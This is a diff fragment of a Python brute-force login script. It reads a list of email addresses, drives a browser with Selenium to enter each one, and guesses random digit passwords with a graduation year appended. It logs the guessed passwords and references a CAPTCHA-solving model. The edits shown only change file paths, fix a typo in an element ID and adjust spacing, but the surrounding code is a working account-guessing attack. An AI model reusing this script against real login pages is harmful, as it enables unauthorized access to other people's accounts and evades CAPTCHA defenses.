@@ -29,7 +29,7 @@ MODEL_FILENAME = "C:/Users//PycharmProjects/chromedriver_win32/captcha_model.hdf
 MODEL_LABELS_FILENAME = "C:/Users//PycharmProjects/chromedriver_win32/model_labels.dat"
 CAPTCHA_IMAGE_FOLDER = "C:/Users//PycharmProjects/chromedriver_win32/generated_captcha_images"
 CAPTCHA_IMAGE = "C:/Users//PycharmProjects/chromedriver_win32/screenshot.png"
-GuessedPasswords = "C:/Users//PycharmProjects/chromedriver_win32/GuessedPasswords"
+GuessedPasswords = "C:/Users/Ryan DeHaan/PycharmProjects/4-Digit-Brute-Force-Program/GuessedPasswords"
 '''Connects to the MySQL database "python_db" with user 'admin' and the password '' '''
 #mydb = mysql.connector.connect(host='localhost', database='python_db', user='admin', password='')
 #mycursor = mydb.cursor()
@@ -49,8 +49,8 @@ print("Tried Passwords:")
 '''While loop that is infinite and will never stop unless Error occurs or program stopped'''
 while x == 1:
     '''Declares file locations to identifiers'''
-    filepath = "C:/Users//PycharmProjects/chromedriver_win32/Email List"
-    backupfile = "C:/Users//PycharmProjects/chromedriver_win32/Users"
+    filepath = "C:/Users/Ryan DeHaan/PycharmProjects/4-Digit-Brute-Force-Program/Email List"
+    backupfile = "C:/Users/Ryan DeHaan/PycharmProjects/4-Digit-Brute-Force-Program/Users"
     '''When the file(Email List) is open it will set all file commands as f. In the file it will
                     read all the line in the file then it will removes all the new line commands("\n") from the list'''
     with open(filepath) as f:
@@ -89,7 +89,7 @@ while x == 1:
          your email. It then types in the input box the variable "usernameStr" that we set to the desired
          Email. Then it finds the next button by its id('identifierNext') and then sets it to the "nextButton" 
          identifier after it finds the element it clicks the button.'''
-        username = browser.find_element_by_id('fieldAcount')
+        username = browser.find_element_by_id('fieldAccount')
         username.send_keys(usernameStr)
 
         '''Has the variable "password" wait until the presence of the element "password" is located, it waits 10
@@ -105,7 +105,7 @@ while x == 1:
             print(info)
             for item in info:
                 if item == passwordStr:
-                    print("already Guessed:",passwordStr)
+                    print("already Guessed:", passwordStr)
                     passwordStr = "".join(choice(digits) for x in range(randint(min_char, max_char))) + gradyear
         password.send_keys(passwordStr)
         fo = open(GuessedPasswords, "a+")
